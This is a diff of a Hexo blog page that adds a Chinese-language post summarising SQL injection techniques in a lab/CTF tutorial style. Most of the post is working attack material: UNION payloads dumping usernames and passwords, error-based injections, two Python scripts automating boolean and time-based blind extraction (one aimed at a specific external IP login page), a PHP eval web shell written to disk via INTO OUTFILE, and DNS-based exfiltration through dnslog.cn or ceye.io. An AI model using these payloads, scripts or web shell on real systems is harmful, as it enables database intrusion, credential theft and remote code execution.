@@ -9,7 +9,7 @@
     <meta http-equiv="Cache-Control" content="no-siteapp">
     <title>
         
-            dyinglight's blog
+            sql注入总结
         
     </title>
     <link rel="shortcut icon" href="#"/>
@@ -32,187 +32,115 @@
 <meta name="generator" content="Hexo 7.1.1"></head>
 <body>
     <a id="cover"></a>
-    <link type="text/css" rel="stylesheet" href="/css/index.css">
-<div id="count"></div>
-<div id="header" >
+    <link type="text/css" rel="stylesheet" href="/css/post.css">
+<div id="header" class="header">
     <div class="vertical">
         <div class="inner">
             
-                <h1 class="header-title">Dyinglight</h1>
-                <h2 class="header-description" id="hitokoto"></h2>
-                <h3 class="header-info" id="hitokotoAuthor"></h3>
+                <h1 class="header-subtitle">sql注入总结</h1>
+                <div class="header-subinfo">
+                    <p class="article-info-text">
+                        <span>
+                            <i class="iconfont icon-time"></i> 发表时间：2024-06-25
+                        </span>
+                        
+                            
+                                <span id="/article/4285413350/" class="leancloud_visitors" data-flag-title="sql注入总结">
+                                    <i class="iconfont icon-browse"></i> 阅读：<sapn class="leancloud-visitors-count"></span>
+                                </span>
+                            
+                            
+                                <span>
+                                    <i class="iconfont icon-interactive"></i> 评论：<span class="valine-comment-count" data-xid="/article/4285413350/"></span>
+                                </span>
+                              
+                        
+                    </p>
+                    
+                    
+                </div>
             
         </div>
     </div>
-    
-        <a class="scroll-down" href="javascript:;" target="_self" data-offset="-45">
-            <i class="scroll-down-icon iconfont icon-return"></i>
-        </a>
     
 </div>
 <div id="container">
     
-        
-            <!-- 首页 -->
-            <div class="articles">
+        <!-- 文章页面 -->
+        <div id="article">
+            <div class="toc"></div>
+            <div class="article-body">
+                <h1 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h1><h2 id="一-什么是注入"><a href="#一-什么是注入" class="headerlink" title="一.什么是注入"></a>一.什么是注入</h2><p>所谓SQL注入，就是通过把SQL命令插入到WEB表单提交或输入域名或页面请求的查询字符串，最终到达欺骗服务器执行恶意的SQL命令，从而进一步得到相应的数据信息。通过构造一条精巧的语句，来查询到想要得到的信息。</p>
+<p><img src="/../images/sql%E6%B3%A8%E5%85%A5/1.png"></p>
+<h2 id="二-常规注入步骤"><a href="#二-常规注入步骤" class="headerlink" title="二.常规注入步骤"></a>二.常规注入步骤</h2><h3 id="1-判断注入点类型"><a href="#1-判断注入点类型" class="headerlink" title="1.判断注入点类型"></a>1.判断注入点类型</h3><p>提交and 1&#x3D;1和and 1&#x3D;2，如果两个都能正常显示则为字符型注入，如果1&#x3D;2无法正常显示则为数字型注入</p>
+<p>还有一种判断方法是使用2-1,看页面是否正常显示，数字型可以计算2-1所以会正常显示，字符型会报错（这种方法的优点是绕过对＝号的检查）</p>
+<p>确定是字符型后需要尝试闭合查询语句，例如<code>),&#39;,&quot;</code>,可以根据报错语句闭合，然后在最后加上#或–+注释掉之后的语句，正确的闭合方式表现为：加注释之前为错误界面，加注释符之后为正确页面</p>
+<h3 id="2-判断列数"><a href="#2-判断列数" class="headerlink" title="2.判断列数"></a>2.判断列数</h3><p>二分法判断列数，<code>?id=1 group by 5</code>或<code>?id=1 order by 5</code>，如果到某个数字恰好页面能正常显示，那么可以确定列数</p>
+<h3 id="3-union联合注入"><a href="#3-union联合注入" class="headerlink" title="3.union联合注入"></a>3.union联合注入</h3><p>根据2拿到的列数构造查询语句（注：把id改成0、-1）<br><code>?id=-1 union select 1,2,3--+</code><br>看回显的位置，按照查库–&gt;表–&gt;列的顺序找到数据<br>(1)查库：3 -&gt;database()<br>(2)查表：3 -&gt;(group_concat(table_name) from information_schema.tables where table_schema&#x3D;database())<br>(3)查列：3 -&gt;(group_concat(column_name)) from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;’users’)<br>(4)查数据：3 -&gt;(select group_concat(username,password) from users)</p>
+<p>注：最好用括号把语句括起来，提升优先级</p>
+<h2 id="三-非常规注入"><a href="#三-非常规注入" class="headerlink" title="三.非常规注入"></a>三.非常规注入</h2><h3 id="1-报错注入（适用于无回显，但是报错正常回显）"><a href="#1-报错注入（适用于无回显，但是报错正常回显）" class="headerlink" title="1.报错注入（适用于无回显，但是报错正常回显）"></a>1.报错注入（适用于无回显，但是报错正常回显）</h3><p>三大常见报错注入:floor(),extractValue(),updateXml()</p>
+<p>(1)extractValue()函数<br>原本用法：<code>select extractvalue(doc,&#39;/book/author/surname&#39;) from xml</code>从xml查询文件<br>利用方法：<code>select extractvalue(doc,concat(0x7e,($注入点))) from xml </code><br>0x7e是波浪号的16进制，把&#x2F;换成~引起报错<br>doc可以任意写，不影响<br>注入时只需要将注入点替换为select查询语句<br>注：这种方法最多同时显示32个字符，使用substring函数截取。substring(查询结果，从m显示，显示n个)</p>
+<p>(2)updatexml()函数<br>原本用法：UPDATEXML(xml_target, xpath_expr, new_val)替换xml文档内容<br>利用方法：同上，更改path的第一个字符为~<br>其他两个参数无影响<img src="/../images/sql%E6%B3%A8%E5%85%A5/3.png"></p>
+<p>(3)floor()函数<br>使用函数介绍：rand()生成一个0-1的小数，floor()小数向下取整,concat_ws()将括号内的数据用一个字段连接，as起别名，count():汇总统计数量，limit显示指定行数如limit 0,1从0行开始显示一行</p>
+<p><code>select count(*),concat_ws(&#39;-&#39;,($注入点),floor(rand(0)*2)) as a from users group by a;</code></p>
+<p>报错原因：rand()函数进行分组group by和统计count()时可能会多次执行，导致键值key重复</p>
+<h3 id="2-bool盲注（适用于无回显，不报错，但是页面能反映出真假）"><a href="#2-bool盲注（适用于无回显，不报错，但是页面能反映出真假）" class="headerlink" title="2.bool盲注（适用于无回显，不报错，但是页面能反映出真假）"></a>2.bool盲注（适用于无回显，不报错，但是页面能反映出真假）</h3><p>函数简介：ascii()转换字母为ascii码<br>原理：利用substr()截取字符串的每一个字符，转换成ascii码进行比较，如果对了则页面为true</p>
+<p><img src="/../images/sql%E6%B3%A8%E5%85%A5/6.png"><br>这里使用了limit 0,1来保证每次只查询一个表的名字<br>改变substr()里的内容即可注入</p>
+<p>可以看到，布尔盲注的人工查询效率很低，因此可以编写一个python脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">requests.adapters.DEFAULT_RETRIES = <span class="number">5</span></span><br><span class="line">conn = requests.session()</span><br><span class="line">conn.keep_alive = <span class="literal">False</span></span><br><span class="line">flag = <span class="string">&#x27;You are in...&#x27;</span> <span class="comment"># 根据返回页面的特征值来判断是否注入成功，先改这里！</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getName</span>(<span class="params">url</span>):</span><br><span class="line">    DBName = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;开始获取长度...&quot;</span>)</span><br><span class="line">    <span class="built_in">len</span> = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> l <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">99</span>):</span><br><span class="line">        time.sleep(<span class="number">0.06</span>)</span><br><span class="line">        payload = <span class="string">f&quot;&#x27; and length((select database()))=<span class="subst">&#123;l&#125;</span>--+&quot;</span> <span class="comment"># 获取数据库名长度,可以更改为查表名长度，字段长度等</span></span><br><span class="line">        res = conn.get(url=url+payload) <span class="comment"># 发送请求</span></span><br><span class="line">        <span class="keyword">if</span> flag <span class="keyword">in</span> res.content.decode(<span class="string">&quot;utf-8&quot;</span>): <span class="comment"># 判断是否成功</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;数据库名长度为：&quot;</span>+<span class="built_in">str</span>(l))</span><br><span class="line">            <span class="built_in">len</span> = l</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;开始获取名...&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="built_in">len</span>+<span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">33</span>,<span class="number">127</span>):</span><br><span class="line">            time.sleep(<span class="number">0.06</span>)</span><br><span class="line">            payload = <span class="string">f&quot;&#x27; and ascii(substr((select database()),<span class="subst">&#123;i&#125;</span>,1))=<span class="subst">&#123;j&#125;</span>--+&quot;</span> <span class="comment"># 获取数据库名,可以更改为查表名，字段名等</span></span><br><span class="line">            res = conn.get(url=url+payload)</span><br><span class="line">            <span class="keyword">if</span> flag <span class="keyword">in</span> res.content.decode(<span class="string">&quot;utf-8&quot;</span>): <span class="comment"># 判断是否成功</span></span><br><span class="line">                DBName += <span class="built_in">chr</span>(j)</span><br><span class="line">                <span class="built_in">print</span>(DBName)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> DBName</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line"> url=<span class="string">&quot;http://127.0.0.1/sqli-labs/Less-5/?id=1&quot;</span> <span class="comment">#目标url</span></span><br><span class="line"> <span class="built_in">print</span>(getName(url)) <span class="comment">#调用函数</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="3-时间盲注（适用于页面无任何变化，页面响应时间不同）"><a href="#3-时间盲注（适用于页面无任何变化，页面响应时间不同）" class="headerlink" title="3.时间盲注（适用于页面无任何变化，页面响应时间不同）"></a>3.时间盲注（适用于页面无任何变化，页面响应时间不同）</h3><p>本质上是通过时间判断布尔的真假<br>sleep()函数，休眠<br>if(1,2,3)函数，1为条件，当条件为真2执行，否则3执行<br>payload:<code>?id=-1 || if(ascii(substr(查询语句,i,j))&gt;100,sleep(0),sleep(3))</code></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://210.30.97.133:10168/login&quot;</span></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">300</span>):</span><br><span class="line">    time.sleep(<span class="number">0.06</span>)</span><br><span class="line">    low = <span class="number">32</span></span><br><span class="line">    high = <span class="number">128</span></span><br><span class="line">    mid = (low + high) // <span class="number">2</span></span><br><span class="line">    <span class="keyword">while</span> low &lt; high:</span><br><span class="line">        payload = <span class="string">&quot;1&#x27; || if(ascii(substr((database()),&#123;i&#125;,1))=&#123;mid&#125;,sleep(1),0)&quot;</span></span><br><span class="line">        temp = &#123;<span class="string">&quot;username&quot;</span>: <span class="string">&quot;admin&quot;</span>, <span class="string">&quot;password&quot;</span>: payload&#125;</span><br><span class="line">        start_time = time.time()</span><br><span class="line">        response = requests.post(url=url, data=temp)</span><br><span class="line">        end_time = time.time()</span><br><span class="line">        <span class="keyword">if</span> end_time - start_time &gt; <span class="number">2</span>:</span><br><span class="line">            low = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            high = mid</span><br><span class="line">        mid = (low + high) // <span class="number">2</span></span><br><span class="line">    <span class="keyword">if</span> mid == <span class="number">32</span> <span class="keyword">or</span> mid == <span class="number">127</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    flag += <span class="built_in">chr</span>(mid)</span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>这个脚本使用了二分法提高查找效率</p>
+<h3 id="4-文件上传"><a href="#4-文件上传" class="headerlink" title="4.文件上传"></a>4.文件上传</h3><p>前提：在sql命令行中输入<code>show variables like &#39;%secure%&#39;</code>，显示的secure_file_priv为空，则可以任意读写文件<br>一句话木马：<code>&lt;?php @eval($_POST[&#39;cmd&#39;]);?&gt;</code><br>payload:<code>union select 1,2,&quot;&lt;?php @eval($_POST[&#39;cmd&#39;]);?&gt;&quot; into outfile &quot;路径&quot;#</code><br>之后使用蚁剑连接</p>
+<h3 id="5-dnslog注入"><a href="#5-dnslog注入" class="headerlink" title="5.dnslog注入"></a>5.dnslog注入</h3><p>前提：读写权限打开<br>load_file()函数：参数为UNC路径 -&gt; &#x2F;servername&#x2F;sharename&#x2F;filename<br>payload：<code>select load_file(//(注入点).192.0.0.1/123/1.txt)</code><br>使用ceye.io或者<a target="_blank" rel="noopener" href="http://www.dnslog.cn可以拿到dns域名,我们采用注入点.域名的方式可以在这两个网站拿到注入结果/">www.dnslog.cn可以拿到dns域名，我们采用注入点.域名的方式可以在这两个网站拿到注入结果</a></p>
+<p>注入点：select database()…..</p>
+<p>完整payload:?id&#x3D;1 and (select load_file(concat(“&#x2F;&#x2F;“,(注入点),”.域名&#x2F;ben.txt”))) #<br>使用concat防止双引号影响命令执行</p>
+
                 
-                    <div class="article">
-                        <div class="article-title">
-                            <a href="/article/4285413350/">sql注入总结</a>
-                            
-                        </div>
-                        <div class="article-abstract">
-                            
-                        </div>
-                        <div class="clear"></div>
-                        <div class="article-info">
-                            <span>
-                                <i class="iconfont icon-time"></i> 发表时间：2024-06-25
-                            </span>
-                            
-                                
-                                    <span id="/article/4285413350/" class="leancloud_visitors" data-flag-title="sql注入总结">
-                                        <i class="iconfont icon-browse"></i> 阅读：<sapn class="leancloud-visitors-count"></span>
-                                    </span>
-                                
-                                
-                                    <span>
-                                        <i class="iconfont icon-interactive"></i> 评论：<span class="valine-comment-count" data-xid="/article/4285413350/"></span>
-                                    </span>
-                                
-                            
-                        </div>
-                        <div class="clear"></div>     
-                    </div>
+                <p class="end">__END__</p>
+            </div>
+            <div class="article-footer">
+                <div class="suffix-box">
+    <div class="suffix-box-left">
+        <img src="/image/sidebar/RL02.jpg" alt="Dyinglight">
+    </div>
+    <div class="suffix-box-right">
+        <span class="suffix-box-title">文章作者：</span>Dyinglight
+        <br>
+        <span class="suffix-box-title">文章出处：</span><a href="/article/4285413350/" target="_blank">sql注入总结</a>
+        <br>
+        <span class="suffix-box-title">作者签名：</span>原神,启动！
+        <br>
+        <span class="suffix-box-title">关于主题：</span><a href="https://github.com/first19326/Hexo-LiveForCode" target="_blank">Hexo - Live For Code</a>
+        <br>
+        <span class="suffix-box-title">版权声明：</span>文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-nd/4.0/" title="BY-NC-SA" target="_blank">BY-NC-SA</a> 许可协议，转载请注明出处
+        <br>
+    </div>
+    <div style="clear: both;"></div>
+</div>
                 
-                    <div class="article">
-                        <div class="article-title">
-                            <a href="/article/2908473467/">ciscn-wp</a>
-                            
-                        </div>
-                        <div class="article-abstract">
-                            
-                        </div>
-                        <div class="clear"></div>
-                        <div class="article-info">
-                            <span>
-                                <i class="iconfont icon-time"></i> 发表时间：2024-05-18
-                            </span>
-                            
-                                
-                                    <span id="/article/2908473467/" class="leancloud_visitors" data-flag-title="ciscn-wp">
-                                        <i class="iconfont icon-browse"></i> 阅读：<sapn class="leancloud-visitors-count"></span>
-                                    </span>
-                                
-                                
-                                    <span>
-                                        <i class="iconfont icon-interactive"></i> 评论：<span class="valine-comment-count" data-xid="/article/2908473467/"></span>
-                                    </span>
-                                
-                            
-                        </div>
-                        <div class="clear"></div>     
-                    </div>
                 
-                    <div class="article">
-                        <div class="article-title">
-                            <a href="/article/479963934/">ISCC-wp-dyinglight</a>
-                            
-                        </div>
-                        <div class="article-abstract">
-                            
-                        </div>
-                        <div class="clear"></div>
-                        <div class="article-info">
-                            <span>
-                                <i class="iconfont icon-time"></i> 发表时间：2024-05-01
-                            </span>
-                            
-                                
-                                    <span id="/article/479963934/" class="leancloud_visitors" data-flag-title="ISCC-wp-dyinglight">
-                                        <i class="iconfont icon-browse"></i> 阅读：<sapn class="leancloud-visitors-count"></span>
-                                    </span>
-                                
-                                
-                                    <span>
-                                        <i class="iconfont icon-interactive"></i> 评论：<span class="valine-comment-count" data-xid="/article/479963934/"></span>
-                                    </span>
-                                
-                            
-                        </div>
-                        <div class="clear"></div>     
-                    </div>
-                
-                    <div class="article">
-                        <div class="article-title">
-                            <a href="/article/862536289/">SSSCTFwp-Dyinglight</a>
-                            
-                        </div>
-                        <div class="article-abstract">
-                            
-                        </div>
-                        <div class="clear"></div>
-                        <div class="article-info">
-                            <span>
-                                <i class="iconfont icon-time"></i> 发表时间：2024-04-27
-                            </span>
-                            
-                                
-                                    <span id="/article/862536289/" class="leancloud_visitors" data-flag-title="SSSCTFwp-Dyinglight">
-                                        <i class="iconfont icon-browse"></i> 阅读：<sapn class="leancloud-visitors-count"></span>
-                                    </span>
-                                
-                                
-                                    <span>
-                                        <i class="iconfont icon-interactive"></i> 评论：<span class="valine-comment-count" data-xid="/article/862536289/"></span>
-                                    </span>
-                                
-                            
-                        </div>
-                        <div class="clear"></div>     
-                    </div>
-                
-                    <div class="article">
-                        <div class="article-title">
-                            <a href="/article/1615743781/">php命令执行</a>
-                            
-                        </div>
-                        <div class="article-abstract">
-                            
-                        </div>
-                        <div class="clear"></div>
-                        <div class="article-info">
-                            <span>
-                                <i class="iconfont icon-time"></i> 发表时间：2024-04-17
-                            </span>
-                            
-                                
-                                    <span id="/article/1615743781/" class="leancloud_visitors" data-flag-title="php命令执行">
-                                        <i class="iconfont icon-browse"></i> 阅读：<sapn class="leancloud-visitors-count"></span>
-                                    </span>
-                                
-                                
-                                    <span>
-                                        <i class="iconfont icon-interactive"></i> 评论：<span class="valine-comment-count" data-xid="/article/1615743781/"></span>
-                                    </span>
-                                
-                            
-                        </div>
-                        <div class="clear"></div>     
-                    </div>
-                
+                <div class="article-prev-next">
+                    
+                    
+                        <a href="/article/2908473467/" class="next-prefix">» </a> 下一篇：    <a href="/article/2908473467/" title="发布于 2024-05-18 09:38">ciscn-wp</a>
+                    
+                </div>
             </div>
             
-            
+    <div class="article-comments">
         
-    <div class="pagination-bottom">
-        <div class="pagination">
-            
-                <a href="/page/2/">下一页</a>
-            
-        </div>
+            <div class="comments-title">
+                评论列表
+            </div>
+        
+        <div class="comments-content"></div>
     </div>
-
+    
+ 
+        </div>
     
 </div>
     <div id="footer">
@@ -244,7 +172,7 @@
             <div class="menu-list">
                 <ul>
                     
-                        <li class=" active "><a href="/" class="" target="_self"><span class="iconfont icon-home-fill"></span>首页</a></li>
+                        <li class=""><a href="/" class="" target="_self"><span class="iconfont icon-home-fill"></span>首页</a></li>
                     
                         <li class=""><a href="/category" class="" target="_self"><span class="iconfont icon-folder-fill"></span>分类</a></li>
                     
